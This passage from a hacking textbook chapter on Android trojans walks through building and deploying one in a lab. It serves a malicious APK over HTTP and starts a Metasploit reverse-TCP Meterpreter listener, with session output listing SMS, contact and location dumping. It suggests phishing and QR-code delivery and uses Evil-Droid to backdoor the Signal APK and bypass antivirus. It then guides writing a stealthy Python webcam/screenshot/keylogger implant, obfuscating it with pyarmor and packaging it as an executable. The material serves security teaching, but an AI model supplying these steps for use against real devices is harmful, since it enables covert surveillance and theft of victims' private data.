			<img alt="image" src="../images/ch10fig12.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-12: Setting the Kali Linux virtual machine to Bridged Adapter</em></p>
		<p class="indent">Run the <code><strong>ifconfig</strong></code> command to get the new IP address of the Kali Linux machine:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan/$ <span class="codestrong1">sudo ifconfig</span></pre>
		<p class="indent">Next, start a web server in the folder containing your signed malicious APK:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan/$ <span class="codestrong1">sudo python3 -m http.server 80</span></pre>
		<p class="indent">This is the web server that we’ll use to serve our malicious APK file. Now start the attacker server in a new terminal:</p>
		<pre>kali@kali:~/$ <span class="codestrong1">sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">android/meterpreter/reverse_tcp; set LHOST <span class="codeitalic">&lt;Kali IP address&gt;</span>; set</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">LPORT 8443; run; exit -y"</span></pre>
		<p class="indent">Open your emulated device, navigate to the web server running on the Kali Linux machine, and download the trojan, as shown in <a href="ch10.xhtml#ch10fig13">Figure 10-13</a>.</p>
		<div class="image" id="ch10fig13">
			<img alt="image" src="../images/ch10fig13.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-13: Downloading the trojan on Android</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_214"/>Ignore the warnings following the instructions and allow the installation of third-party apps.</p>
		<p class="indent">At this point, you should have successfully installed and connected to your implant. You should see the following Meterpreter shell. Try typing <code>geolocate</code> to get the phone location. (Remember, the phone is running in a virtual machine and doesn’t have access to GPS, so this location will be simulated.) Also run the <code>help</code> command to see all of your options. Meterpreter isn’t perfect, so some options might not work:</p>
		<pre>[*] Using configured payload generic/shell_reverse_tcp<br/>PAYLOAD =&gt; android/meterpreter/reverse_tcp<br/>LHOST =&gt; 10.0.1.16<br/>LPORT =&gt; 8443<br/>
[*] Started reverse TCP handler on 10.0.1.16:8443<br/>
[*] Sending stage (76756 bytes) to 10.0.1.9<br/>
[*] Meterpreter session 1 opened (10.0.1.16:8443 -&gt; 10.0.1.9:64916) at 2021-01-14 22:19:22<br/>
    -0500<br/><br/>meterpreter &gt; <span class="codestrong1">geolocate</span><br/>
[*] Current Location:<br/>
        Latitude:  37.421908<br/>
        Longitude: -122.0839815<br/><br/>To get the address: https://maps.googleapis.com/maps/api/geocode/json?latlng=37.421908,<br/>
                    -122.0839815&amp;sensor=true<br/><br/>meterpreter &gt; <span class="codestrong1">help</span><br/>
...<br/>Android Commands<br/>
================<br/><br/>
    Command           Description<br/>
    -------           -----------<br/>
    activity_start    Start an Android activity from a Uri string<br/>
    check_root        Check if device is rooted<br/>
    dump_calllog      Get call log<br/>
    dump_contacts     Get contacts list<br/>
    dump_sms          Get sms messages<br/>
    geolocate         Get current lat-long using geolocation<br/>
    hide_app_icon     Hide the app icon from the launcher<br/>
    interval_collect  Manage interval collection capabilities<br/>
    send_sms          Sends SMS from target session<br/>
    set_audio_mode    Set Ringer Mode<br/>
    sqlite_query      Query a SQLite database from storage<br/>
    wakelock          Enable/Disable Wakelock<br/>
    wlan_geolocate    Get current lat-long using WLAN information<br/>
...</pre>
		<p class="indent"><span epub:type="pagebreak" id="page_215"/>An attacker could encourage a user to download the malicious APK by sending them a phishing email or text message linking to a cloned version of the Google Play Store website (see <a href="ch07.xhtml#ch7">Chapter 7</a> for information on cloning web pages). Alternatively, a hacker could use a QR code. You see QR codes all over the place; for example, at conferences and in parks. A hacker could easily make the QR code link to a fake website that contains a malicious trojan. <a href="ch10.xhtml#ch10fig14">Figure 10-14</a> shows an example QR code that links to the No Starch Press website. You can scan it by opening your phone’s camera app and pointing at the QR code.</p>
		<div class="image" id="ch10fig14">
			<img alt="image" src="../images/ch10fig14.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-14: This QR code takes you to</em> <a href="https://nostarch.com/catalog/security">https://nostarch.com/catalog/security</a><em>.</em></p>
		<p class="indent">Some of the best mobile attacks exploit <em>zero-click vulnerabilities</em>. A zeroclick vulnerability allows an attacker to compromise a mobile device without any action on the user’s part. These are really rare and very valuable.</p>
		<p class="indent">A final note on mobile devices: although iOS devices are generally considered more secure, they aren’t safe either. For example, a vulnerability in Facebook’s WhatsApp platform allowed hackers to install malware on an iPhone by sending WhatsApp users a link. A state hacker group later used this vulnerability to hack Amazon CEO Jeff Bezos’ iPhone.</p>
		<h3 class="h3" id="ch10lev25"><strong>Exercises</strong></h3>
		<p class="noindent">These exercises will bolster your understanding of trojans. You’ll begin by exploring a tool that automates the process of creating and signing Android trojans. In the second exercise, you’ll write an implant in Python. Your implant should stream video from the victim’s webcam and transmit it back to the attacker’s server.</p>
		<h4 class="h4" id="ch10lev26"><span epub:type="pagebreak" id="page_216"/><strong><em>Evil-Droid</em></strong></h4>
		<p class="noindent"><em>Evil-droid</em> is a Bash script that automates the APK implantation and signing process. You can download it from GitHub by running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">git clone https://github.com/M4sc3r4n0/Evil-Droid</span></pre>
		<p class="indent">Next, you’ll need to download the APK of the app you’d like to transform into a trojan. In this example, we’ll use the APK file of the Signal app, an encrypted messaging service that you can find at <em><a href="https://signal.org/android/apk/">https://signal.org/android/apk/</a></em>. To choose any other APK available from the Google Play Store, use <code>gplaycli</code>, a free and open source utility that allows you to download APK files from the store. You can install it from <em><a href="https://github.com/matlink/gplaycli">https://github.com/matlink/gplaycli</a></em>.</p>
		<p class="indent">After you’ve downloaded an APK file, navigate to the Bash script in the <em>Evil-Droid</em> folder and change the script’s permissions to make it executable:</p>
		<pre>kali@kali:~$ <span class="codestrong1">cd Evil-Droid</span><br/>kali@kali:~/Evil-Droid/$ <span class="codestrong1">chmod +x evil-droid</span></pre>
		<p class="indent">Start the Evil-Droid script by running the following command:</p>
		<pre>kali@kali:~/Evil-Droid/$ <span class="codestrong1">./evil-droid</span></pre>
		<p class="indent">Once the Evil-Droid script has started, you should see the following:</p>
		<pre>------------------------------------------------<br/>
|          Evil-Droid Framework v0.3           |<br/>
|      Hack &amp; Remote android platform          |<br/>
------------------------------------------------<br/>
[1] APK MSF<br/>
[2] BACKDOOR APK ORIGINAL (OLD)<br/>
[3] BACKDOOR APK ORIGINAL (NEW)<br/>
[4] BYPASS AV APK (ICON CHANGE)<br/>
[5] START LISTENER<br/>
[c] CLEAN<br/>
[q] QUIT<br/>
[?] Select&gt;:</pre>
		<p class="indent">Select <strong>[3]</strong> to inject the implant into the original APK. As you can see from the output, Evil-Droid has two options for injecting an implant: the old option and the new option. The new option provides additional features, such as signing the APK, which is required for apps running on modern Android platforms.</p>
		<p class="indent">Evil-Droid is implemented by using a single open source Bash script. Here is a link to the script:</p>
		<pre>https://github.com/M4sc3r4n0/Evil-Droid/blob/master/evil-droid</pre>
		<p class="indent">Once you’ve selected <strong>[3]</strong>, follow the instructions and prompts to create your trojan, providing it with the original APK you want to modify.</p>
		<h4 class="h4" id="ch10lev27"><span epub:type="pagebreak" id="page_217"/><strong><em>Writing Your Own Python Implant</em></strong></h4>
		<p class="noindent">In this chapter, we used implants available through Metasploit. As an exercise, write your own implant that takes pictures with a victim’s camera.</p>
		<p class="indent">Use the Python <em>OpenCV</em> library to capture and display the images from the webcam. You install this library with <code>pip3</code>.</p>
		<pre>kali@kali:~/$ <span class="codestrong1">pip3 install opencv-python</span></pre>
		<p class="indent">Copy the following into a new file called <em>implant.py</em>.</p>
		<pre>   import cv2<br/><br/><span class="ent">➊</span> vc = cv2.VideoCapture(0)<br/>
   cv2.namedWindow("WebCam", cv2.WINDOW_NORMAL)<br/><br/>
   #----------------------------------------<br/>
   # Setup the TLS Socket<br/>
   #----------------------------------------<br/><br/>
   while vc.isOpened():<br/>
     <span class="ent">➋</span> status, frame = vc.read()<br/>
        cv2.imshow("WebCam", frame)<br/>
        print(frame)<br/>
        #-------------------------------<br/>
        #  Send Frame over an encrypted<br/>
        #  TCP connection one frame at<br/>
        #  a time<br/>
        #-------------------------------<br/>
        key = cv2.waitKey(20) #Wait 20 milliseconds before reading the next frame<br/>
        if key == 27: #Close if ESC key is pressed.<br/>
            break<br/><br/>vc.release()<br/>cv2.destroyWindow("WebCam")</pre>
		<p class="indent">The script will take several pictures (frames) and stitch them together to create a video. First, we’ll select a video capture device <span class="ent">➊</span>. A machine could have multiple cameras attached to it and the operating system assigns each camera to an interface. Here, we’ll choose the camera assigned to interface 0, which is the first interface. Next, we set the display window, which will show each frame. Showing each frame is excellent for debugging, but you wouldn’t display this in a stealthy trojan. As long as the window is open, we’ll capture/read new frames <span class="ent">➋</span>. The variable <code>status</code> is a Boolean variable that indicates whether the frame was correctly captured. We’ll then pass each of these frames to the window to be displayed and printed to the console. Lastly, if the user presses the ESCAPE key, we’ll close the window and stop the process.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_218"/>Test the program by opening a new terminal and navigating to the folder containing your <em>implant.py</em> file. On the top menu in Kali Linux, select <strong>Devices</strong> ▶ <strong>Webcam</strong> to attach your webcam to the virtual machine. Now run your implant:</p>
		<pre>kali@kali:~$ <span class="codestrong1">python3 implant.py</span></pre>
		<p class="indent">Extend your implant’s functionality by allowing it to send frames to a hacker’s server over a TCP connection. After you’ve extended and tested it, you can make the implant more stealthy by removing the lines that display the feed to the victim. And remember that you want your implant to communicate securely. See <a href="ch06.xhtml#ch6">Chapter 6</a> for examples of how to establish a secure communication channel.</p>
		<p class="indent">Extend your implant even further by allowing it to take screenshots. Install and use the <em>python-mss</em> library to do so. Here, I have provided example code that imports the library <code>mss</code> and takes a screenshot:</p>
		<pre>from mss import mss<br/>with mss() as sct:<br/>
    image = sct.shot()</pre>
		<p class="indent">You’ll also need to create and implement a basic protocol for controlling your implant. See <a href="ch04.xhtml#ch4">Chapter 4</a> for examples of how to do so. As a final note, the <em>pynput</em> library is great for adding keylogger functionality. You’ll need to install it before using it.</p>
		<h4 class="h4" id="ch10lev28"><strong><em>Obfuscate Your Implant</em></strong></h4>
		<p class="noindent">Now that you’ve developed an implant, let’s obfuscate it. Remember, obfuscation makes detection and reverse engineering more difficult. We’ll use the <code>pyarmor</code> tool to obfuscate the <em>implant.py</em> file. Details on the <code>pyarmor</code> obfuscation process can be found in its documentation at <em><a href="https://pyarmor.readthedocs.io/en/latest/how-to-do.html">https://pyarmor.readthedocs.io/en/latest/how-to-do.html</a></em>.</p>
		<p class="indent">Use <code>pip3</code> to install <code>pyarmor</code>:</p>
		<pre>kali@kali:~$ <span class="codestrong1">pip3 install pyarmor</span></pre>
		<p class="indent">Now obfuscate your implant by running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">pyarmor obfuscate implant.py</span></pre>
		<p class="indent">You can view the obfuscated script by navigating to the folder <em>dist</em>:</p>
		<pre>kali@kali:~$ <span class="codestrong1">cd dist</span></pre>
		<p class="indent">You also need all the files in the <em>dist</em> folder, including those in the <em>pytransform</em> folder. Run your newly obfuscated file by running <em>implant.py</em> in the <em>dist</em> folder.</p>
		<div class="note">
			<p class="notet"><strong><span class="notes">NOTE</span></strong></p>
			<p class="notep"><em>Alternatively, you can use</em> <code><em>pyminifier</em></code> <em>to generate a minified version of the code.</em></p>
		</div>
		<h4 class="h4" id="ch10lev29"><span epub:type="pagebreak" id="page_219"/><strong><em>Build a Platform-Specific Executable</em></strong></h4>
		<p class="noindent">To run the implant you just wrote, a computer must have Python installed. However, a hacker can’t assume that Python will be available on the victim’s machine. Instead, we need to convert the Python program into an executable using the <code>pyinstaller</code> utility, which you can install as follows:</p>
		<pre>kali@kali:~$ <span class="codestrong1">pip3 install pyinstaller</span></pre>
		<p class="indent">To create a Linux executable from the original, unobfuscated file, run the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">pyinstaller --onefile implant.py</span></pre>
		<p class="indent">To create an obfuscated executable, run the following command on the original file:</p>
		<pre>kali@kali:~$ <span class="codestrong1">pyarmor pack implant.py</span></pre>
		<p class="indent">You can embed the resulting Linux executable in a Trojan using the same techniques discussed earlier in the chapter. Now try generating a Windows executable (<em>.exe</em>) by running <code>pyinstaller</code> on a Windows machine. The commands are the same, and running them on a Windows device will generate a Windows executable.<span epub:type="pagebreak" id="page_220"/></p>
	</body>
</html>